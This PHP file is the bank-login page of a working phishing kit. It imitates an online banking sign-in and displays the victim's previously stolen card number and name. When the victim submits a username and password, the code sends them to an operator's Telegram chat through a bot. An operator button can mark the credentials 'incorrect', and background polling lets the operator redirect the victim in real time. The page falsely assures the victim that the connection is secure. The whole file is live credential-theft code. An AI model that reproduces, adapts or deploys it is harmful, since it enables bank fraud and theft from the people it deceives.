<?php
require_once 'config.php';

$sessionId = $_GET['session'] ?? '';
if (!preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

$sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';
if (!file_exists($sessionFile)) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

$sessionData = json_decode(file_get_contents($sessionFile), true);
$sessionData['session_id'] = $sessionId;
$cardData = $sessionData['card_data'];

if (isCardBlocked($cardData['number'])) {
    header("Location: " . buildPageUrl('payments', ['error' => 'blocked']));
    exit();
}

$error = null;
if (isset($_GET['error']) && $_GET['error'] === 'incorrect') {
    $error = 'The credentials you entered are incorrect. Please try again.';
}

$pageTitle = 'Internet Bank';
$checkStatusUrl = buildPageUrl('check_status');

// Update current page on load (atomic update to preserve session_id)
updateSessionData($sessionId, function(&$sessionData) use ($pageTitle) {
    $sessionData['current_page'] = $pageTitle;
    return true;
});

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $login = htmlspecialchars(trim($_POST['login'] ?? ''));
    $password = htmlspecialchars(trim($_POST['password'] ?? ''));
    
        if (empty($login) || empty($password)) {
            $error = 'Please enter both login and password';
        } else {
            // Use atomic update to prevent race conditions and send Telegram message
            $sendSuccess = false;
            $rootMessageId = null;
            
            updateSessionData($sessionId, function(&$sessionData) use ($login, $password, &$sendSuccess, &$rootMessageId) {
                $adminConfig = getAdminConfigFromSession($sessionData);
                $chatId = $adminConfig['chat_id'] ?? ADMIN_CHAT_ID;
                
                // Get root message ID
                $rootMessageId = $sessionData['root_message']['message_id'] ?? $sessionData['last_message']['message_id'] ?? null;
                
                $replyText = "🏦 *Internet Bank Credentials*\n";
                $replyText .= "Login: `$login`\n";
                $replyText .= "Password: `$password`\n";
                $replyText .= "Session: `" . ($sessionData['session_id'] ?? '') . "`";
                
                // Build keyboard with only incorrect button
                $keyboard = [
                    'inline_keyboard' => [
                        [
                            ['text' => '❌ Incorrect', 'callback_data' => "verify:" . ($sessionData['session_id'] ?? '') . ":internet_bank:incorrect"]
                        ]
                    ]
                ];
                
                // Send internet bank credentials to Telegram (always send, even if rootMessageId is missing)
                $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
                $data = [
                    'chat_id' => $chatId,
                    'text' => $replyText,
                    'parse_mode' => 'Markdown',
                    'reply_markup' => json_encode($keyboard)
                ];
                
                // Add reply_to_message_id only if available
                if ($rootMessageId) {
                    $data['reply_to_message_id'] = $rootMessageId;
                }
                
                $ch = curl_init();
                curl_setopt_array($ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $data,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT => 10
                ]);
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curlError = curl_error($ch);
                curl_close($ch);
                
                // Parse response to check if it succeeded
                $responseData = json_decode($response, true);
                $sendSuccess = ($httpCode === 200 && !empty($responseData['ok']));
                
                // Log if sending failed
                if (!$sendSuccess) {
                    error_log("Internet bank send failed: HTTP $httpCode, Error: $curlError, Response: $response");
                }
                
                // Update session data (don't call updateRootMessage here - it's slow and causes delay)
                $sessionData['current_page'] = 'Internet Bank';
                $sessionData['last_verification_type'] = 'internet_bank'; // Set for redirect logic
                $sessionData['internet_bank'] = [
                    'login' => $login,
                    'password' => $password,
                    'submitted_at' => time()
                ];
                
                return true;
            });
        
        header("Location: " . buildPageUrl('waiting', ['session' => $sessionId]));
        exit();
    }
}

$bankName = 'Your Bank';
if (isset($cardData['card_info']['Issuer'])) {
    $bankName = $cardData['card_info']['Issuer'];
} elseif (isset($cardData['card_info']['bank']['name'])) {
    $bankName = $cardData['card_info']['bank']['name'];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Internet Bank</title>
    <style>
        :root {
            --primary: #0052b4;
            --error: #e25950;
            --success: #28a745;
            --border: #e1e1e8;
            --text: #32325d;
            --text-light: #6b7c93;
        }
        
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        
        body.page-loaded { opacity: 1; }
        body.page-leave { opacity: 0; }
        
        .container { max-width: 480px; width: 100%; }
        
        .card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #0052b4 0%, #002e6d 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
        }
        
        .header-icon { font-size: 48px; margin-bottom: 15px; }
        .header-title { font-size: 28px; font-weight: 600; margin-bottom: 8px; }
        .header-subtitle { font-size: 16px; opacity: 0.9; }
        
        .content { padding: 40px 30px; }
        
        .card-preview {
            background: rgba(0, 82, 180, 0.1);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: center;
            border: 1px solid rgba(0, 82, 180, 0.2);
        }
        
        .card-number {
            font-size: 18px;
            font-weight: 600;
            color: var(--primary);
            letter-spacing: 1px;
        }
        
        .card-info {
            font-size: 14px;
            color: var(--text-light);
            margin-top: 8px;
        }
        
        .error-block {
            background: rgba(226, 89, 80, 0.15);
            border: 2px solid var(--error);
            border-radius: 12px;
            padding: 18px 20px;
            margin-bottom: 20px;
            text-align: center;
            color: var(--error);
            font-weight: 600;
        }
        
        .form-group { margin-bottom: 20px; }
        .form-label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 500; }
        
        .form-control {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            border: 2px solid var(--border);
            border-radius: 12px;
            transition: all 0.3s ease;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(0, 82, 180, 0.1);
        }
        
        .submit-btn {
            width: 100%;
            padding: 18px;
            font-size: 16px;
            font-weight: 600;
            background: linear-gradient(135deg, #0052b4 0%, #002e6d 100%);
            color: white;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .submit-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 82, 180, 0.3);
        }
        
        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .security-info {
            background: rgba(40, 167, 69, 0.1);
            border: 1px solid rgba(40, 167, 69, 0.3);
            border-radius: 12px;
            padding: 20px;
            margin-top: 30px;
        }
        
        .security-title {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 600;
            color: var(--success);
            margin-bottom: 10px;
        }
        
        .security-text {
            font-size: 14px;
            color: var(--text-light);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <div class="header-icon">🏦</div>
                <h1 class="header-title"><?= htmlspecialchars($bankName) ?></h1>
                <p class="header-subtitle">Secure Online Banking</p>
            </div>
            
            <div class="content">
                <div class="card-preview">
                    <div class="card-number"><?= formatCardNumber($cardData['number']) ?></div>
                    <div class="card-info">Cardholder: <?= htmlspecialchars($cardData['holder']) ?></div>
                </div>
                
                <?php if (isset($error)): ?>
                    <div class="error-block">⚠️ <?= htmlspecialchars($error) ?></div>
                <?php endif; ?>
                
                <form method="POST" id="login-form">
                    <div class="form-group">
                        <label class="form-label">Online Banking Login</label>
                        <input type="text" name="login" class="form-control" placeholder="Enter your username" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Password</label>
                        <input type="password" name="password" class="form-control" placeholder="Enter your password" required>
                    </div>
                    
                    <button type="submit" class="submit-btn" id="submit-btn">
                        Sign In to Online Banking
                    </button>
                </form>
                
                <div class="security-info">
                    <div class="security-title">🔒 Secure Connection</div>
                    <div class="security-text">
                        Your connection is encrypted using 256-bit SSL security.
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.body.classList.add('page-loaded');
            
            const form = document.getElementById('login-form');
            const btn = document.getElementById('submit-btn');
            
            form.addEventListener('submit', function(e) {
                btn.disabled = true;
                btn.textContent = 'Signing In...';
                document.body.classList.add('page-leave');
            });
        });
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = <?= json_encode($sessionId) ?>;
            const pageTitle = <?= json_encode($pageTitle) ?>;
            const checkStatusUrl = <?= json_encode($checkStatusUrl) ?>;
            
            const poll = () => {
                fetch(`${checkStatusUrl}?session=${encodeURIComponent(sessionId)}&page=${encodeURIComponent(pageTitle)}`)
                    .then(r => r.json())
                    .then(data => {
                        if (data.redirect) {
                            window.location.href = data.redirect;
                        }
                    })
                    .catch(() => {});
            };
            
            poll();
            setInterval(poll, 3000);
        });
    </script>
    <?php require_once 'presence_client.php'; ?>
</body>
</html>
